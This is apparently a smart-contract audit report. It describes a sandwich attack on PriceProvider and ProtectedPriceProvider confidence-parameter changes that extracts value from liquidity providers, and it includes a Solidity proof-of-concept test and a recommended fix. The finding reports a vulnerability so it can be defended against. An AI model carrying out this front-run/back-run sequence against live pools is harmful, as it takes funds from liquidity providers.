### Title
`PriceProvider.setConfidenceParam` sandwich attack leaks LP value via unclamped bid/ask shift — (`smart-contracts-poc/contracts/PriceProvider.sol`, `smart-contracts-poc/contracts/ProtectedPriceProvider.sol`)

### Summary
The provider owner (or any granted updater) can call `PriceProviderFactory.setConfidence` to reduce `confidenceParam` in a `PriceProvider` or `ProtectedPriceProvider`. This instantly narrows the bid/ask spread delivered to the pool, shifting the effective swap price. An attacker who observes the pending transaction can sandwich it — buying before the spread narrows and selling after — extracting value from the pool's LPs with no band clamp to limit the magnitude.

### Finding Description

`PriceProvider._getBidAndAskPrice()` computes bid/ask as:

```solidity
uint256 adjustedSpread = spread * confidenceParam;
(uint256 bid, uint256 ask) = _getBidAskFrom(mid, adjustedSpread);
// _getBidAskFrom: delta = mid * adjustedSpread / CONFIDENCE_BASE
//                bid = mid - delta,  ask = mid + delta
``` [1](#0-0) 

After `marginStep` adjustment these become the `bidPriceX64` / `askPriceX64` that `MetricOmmPool.swap()` reads via `_getBidAndAskPriceX64()` and passes to `SwapMath.midAndSpreadFeeX64FromBidAsk` to derive `midPriceX64` and `baseFeeX64`. [2](#0-1) 

Reducing `confidenceParam` narrows the spread: bid rises toward mid, ask falls toward mid, and `baseFeeX64` (the spread fee charged on every swap) decreases. The only guard on `setConfidenceParam` is a **1-minute cooldown** (`CONFIDENCE_COOLDOWN`). There is **no timelock**. [3](#0-2) 

The factory's `setConfidence` enforces only the same cooldown and the provider-owner/updater check: [4](#0-3) 

**Critical difference from `AnchoredPriceProvider`:** `AnchoredPriceProvider._computeBidAsk` clamps the shaped quote to the reference band (`bidOut = min(refBid, cBid)`, `askOut = max(refAsk, cAsk)`), so `confidenceParam` changes are bounded by the immutable band width. [5](#0-4) 

`PriceProvider` and `ProtectedPriceProvider` apply **no such clamp**. The full range `confidenceParam ∈ [0, CONFIDENCE_MAX=1_000_000]` translates directly to unconstrained bid/ask shifts. [6](#0-5) 

**Attack sequence:**

1. Attacker observes a pending `setConfidence` transaction that reduces `confidenceParam` from a high value to a low value.
2. **Front-run:** Attacker buys token0 (pays token1) at the current ask price (wide spread, higher `baseFeeX64`).
3. `confidenceParam` is reduced: spread narrows, bid increases, ask decreases, `baseFeeX64` decreases.
4. **Back-run:** Attacker sells token0 (receives token1) at the new higher bid price (narrow spread, lower fee).
5. Attacker profits from the price discrepancy; LPs bear the loss.

The `priceProviderTimelock` mechanism in `MetricOmmPoolFactory` protects against a full provider swap: [7](#0-6) 

No equivalent timelock protects `confidenceParam` changes, creating an asymmetric protection gap.

### Impact Explanation

**Impact: High.** The pool leaks value to the attacker; LPs receive less than fair value. The magnitude scales with the `confidenceParam` delta and trade size. A change from `CONFIDENCE_MAX = 1_000_000` to 0 shifts the effective swap price by the full oracle spread (e.g., 1% of mid for a 1% oracle spread). On large positions this represents significant principal loss from LP reserves.

### Likelihood Explanation

**Likelihood: Medium.** `PriceProviderFactory.createPriceProvider` is permissionless — any address can become a provider owner and grant updater roles. The pool admin chose to use this provider, implicitly trusting the provider owner. The provider owner may legitimately reduce `confidenceParam` during low-volatility periods, unaware of the sandwich risk. The 1-minute cooldown does not prevent front-running within the same block.

### Recommendation

Add a timelock to `setConfidenceParam` in `PriceProvider` and `ProtectedPriceProvider`, analogous to the `priceProviderTimelock` used for price provider updates in `MetricOmmPoolFactory`. Alternatively, add a reference band clamp to `PriceProvider` and `ProtectedPriceProvider` identical to `AnchoredPriceProvider`'s `_computeBidAsk` clamp, so that `confidenceParam` changes cannot shift the bid/ask beyond a bounded, immutably-set range.

### Proof of Concept

```solidity
function test_setConfidence_sandwich_poc() external {
    // Provider starts with high confidenceParam (wide spread)
    uint256 HIGH_CONFIDENCE = 500_000;
    uint256 LOW_CONFIDENCE  = 10_000;

    vm.prank(providerOwner);
    priceProviderFactory.setConfidence(
        _arr(address(priceProvider)), _arr(HIGH_CONFIDENCE)
    );

    /*** Attacker front-runs: buys token0 at current wide-spread ask ***/
    vm.startPrank(attacker);
    token1.approve(address(pool), type(uint256).max);
    uint256 initialToken1 = token1.balanceOf(attacker);
    (int128 d0,) = pool.swap(attacker, false, int128(TRADE_AMOUNT), 0, abi.encode(attacker), "");
    vm.stopPrank();

    /*** Provider owner reduces confidenceParam — spread narrows ***/
    skip(61); // satisfy 1-minute cooldown
    vm.prank(providerOwner);
    priceProviderFactory.setConfidence(
        _arr(address(priceProvider)), _arr(LOW_CONFIDENCE)
    );

    /*** Attacker back-runs: sells token0 at new higher bid ***/
    vm.startPrank(attacker);
    token0.approve(address(pool), type(uint256).max);
    pool.swap(attacker, true, -d0, 0, abi.encode(attacker), "");
    vm.stopPrank();

    uint256 finalToken1 = token1.balanceOf(attacker);
    assertGt(finalToken1, initialToken1, "No profit: sandwich failed");
    console.log("Profit (token1):", finalToken1 - initialToken1);
}

    function _getBidAndAskPrice() internal returns (uint128, uint128) {
        // 1. Read via the unified price(feedId, pool) path, forwarding the pool (msg.sender).
        //    refTime is already in seconds.
        (uint256 mid, uint256 spread, , uint256 refTime) =
            IPricedOracle(address(offchainOracle)).price(offchainFeedId, msg.sender);

        // 2. Staleness check
        if (_isStale(refTime, block.timestamp, MAX_TIME_DELTA)) {
            return (0, type(uint128).max);
        }

        // 3. Basic validity — price must be positive, spread must not be stalled marker
        if (mid == 0 || spread >= ORACLE_BPS) {
            return (0, type(uint128).max);
        }

        // 4. Price guard check (moved from oracle)
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(offchainFeedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) {
            return (0, type(uint128).max);
        }

        // 5. Compute bid/ask from mid + confidence-adjusted spread
        //    confidenceParam multiplies oracle spread; 0 means no spread
        uint256 adjustedSpread = spread * confidenceParam;
        (uint256 bid, uint256 ask) = _getBidAskFrom(mid, adjustedSpread);

        // 6. Apply marginStep adjustment
        (uint256 bidOut, bool bidOk) = _applyBidAdjustments(bid);
        if (!bidOk || bidOut > type(uint128).max) return (0, type(uint128).max);

        (uint256 askOut, bool askOk) = _applyAskAdjustments(ask);
        if (!askOk || askOut > type(uint128).max) return (0, type(uint128).max);

        // 7. Hard invariant: bid must be strictly less than ask.
        //    Can be violated when marginStep < 0 and confidence is too small.
        if (bidOut >= askOut) return (0, type(uint128).max);

        return (uint128(bidOut), uint128(askOut));
    }
